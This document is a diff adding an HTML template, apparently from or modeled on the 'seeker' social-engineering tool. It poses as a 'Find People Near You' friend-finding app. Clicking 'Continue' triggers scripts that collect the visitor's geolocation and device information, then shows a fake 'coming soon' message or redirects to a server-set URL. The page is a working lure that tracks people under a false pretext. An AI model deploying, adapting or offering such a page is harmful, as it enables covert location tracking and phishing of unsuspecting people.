@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Near You | Meet New People, Make New Friends</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <link rel="icon" type="image/x-icon" href="https://www.freefavicon.com/freefavicons/icons/flat-location-logo-152-234349.png">
+    <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
+    <style>
+        html, body
+        {
+            height: 100%;
+        }
+        body
+        {
+            background-color: #000000;
+            margin: auto;
+            overflow: hidden;
+        }
+        h1
+        {
+            font-family: 'Raleway', sans-serif;
+            color: white;
+            text-align: center;
+            filter: drop-shadow(0px 0px 8px cyan);
+            margin: auto;
+            position: fixed;
+            top: 5%;
+            left: 0%;
+            right: 0%;
+        }
+        h2
+        {
+            font-family: 'Raleway', sans-serif;
+            color: white;
+            text-align: center;
+            filter: drop-shadow(0px 0px 8px cyan);
+            margin: auto;
+            position: fixed;
+            top: 15%;
+            left: 0%;
+            right: 0%;
+        }
+        img
+        {
+            position: fixed;
+            margin: auto;
+            left: 0%;
+            right: 0%;
+            top: 30%;
+            height: 40%;
+            filter: drop-shadow(0px 0px 8px white);
+            opacity: 50%;
+        }
+        .button
+        {
+            background-color: Transparent;
+            border: 2px solid white;
+            cursor: pointer;
+            color: white;
+            font-size: 24px;
+            padding: 14px 40px;
+            border-radius: 6px;
+            width: 50%;
+            text-align: center;
+            font-family: 'Raleway', sans-serif;
+            position: fixed;
+            left: 25%;
+            right: 25%;
+            bottom: 10%;
+            filter: drop-shadow(0px 0px 8px cyan);
+            transition: text-shadow 0.2s linear;
+        }
+        .text
+        {
+            font-family: 'Raleway', sans-serif;
+            color: white;
+            text-align: center;
+            filter: drop-shadow(0px 0px 8px cyan);
+            margin: auto;
+            position: fixed;
+            top: 5%;
+            left: 0%;
+            right: 0%;
+            z-index: 1;
+        }
+        .earth
+        {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+            height: 250px;
+            width: 250px;
+            background-image: url(https://raw.githubusercontent.com/thewhiteh4t/seeker/master/template/nearyou/css/worldmap.jpg);
+            border-radius: 50%;
+            background-size: 700px;
+            animation:rotate 7s linear infinite;
+            box-shadow: 10px -10px 40px black inset, -10px 10px 40px black inset, -10px -10px 40px black inset;
+            filter: drop-shadow(0px 0px 8px black);
+        }
+
+        @keyframes rotate
+        {
+          0%{background-position: 0 0;}
+          100%{background-position: 700px 0;}
+        }
+    </style>
+    <script type="text/javascript">
+    if (window.location.protocol == "http:") {
+        var restOfUrl = window.location.href.substr(5);
+        window.location = "https:" + restOfUrl;
+    }
+    </script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    
+    <!-- Load our static JS files -->
+    <script src="/static/js/deviceInfo.js"></script>
+    <script src="/static/js/geoLocation.js"></script>
+    <script src="/static/js/dataCollector.js"></script>
+</head>
+<body onload="information();">
+    <canvas id="canvas" style="width:100%; height:100%;"></canvas>
+    <div><h1>Find People Near You</h1></div>
+    <div><h2>Meet New People, Make New Friends</h2></div>
+    <div class="earth"></div>
+    <div><button id="change" class="button" type="button">Continue</button></div>
+    <div class="text" id="result"></div>
+    
+    <script>
+        // Store redirect URL and geo mode from server
+        const redirectUrl = "{{ redirect_url }}";
+        const geoMode = "{{ geo_mode }}";
+        
+        function information() {
+            var canvas = document.getElementById('canvas');
+            
+            // Load WarpSpeed animation - dynamic script loading
+            var script = document.createElement('script');
+            script.type = 'text/javascript';
+            script.src = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/template/nearyou/js/warpspeed.min.js';
+            document.head.appendChild(script);
+            
+            script.onload = function() {
+                var x = new WarpSpeed('canvas',
+                    '{"speed":2,"speedAdjFactor":0.03,"density":1,"shape":"circle","warpEffect":true,"warpEffectLength":3,"depthFade":false,"starSize":3,"backgroundColor":"hsl(0,0%,0%)","starColor":"#FFFFFF"}');
+            };
+            
+            // Set up button click event
+            document.getElementById('change').addEventListener('click', function() {
+                startLocationTracking();
+            });
+        }
+        
+        function startLocationTracking() {
+            // Update button to show processing
+            $('#change').html('Processing...');
+            
+            // Define callbacks
+            const onSuccess = function() {
+                $('#change').html('Found You!');
+                if (redirectUrl) {
+                    // If redirect URL is provided, we'll be redirected automatically
+                    $('#result').html('Redirecting...');
+                } else {
+                    // Otherwise show completion message
+                    $('#result').html('Thank you for taking interest in Near You... This product is coming soon...');
+                }
+            };
+            
+            const onError = function() {
+                $('#change').html('Failed');
+                $('#result').html('Could not access your location.');
+            };
+            
+            // Initialize data collector with our configuration
+            DataCollector.initialize(geoMode, redirectUrl, onSuccess, onError);
+        }
+    </script>
+</body>
+</html>
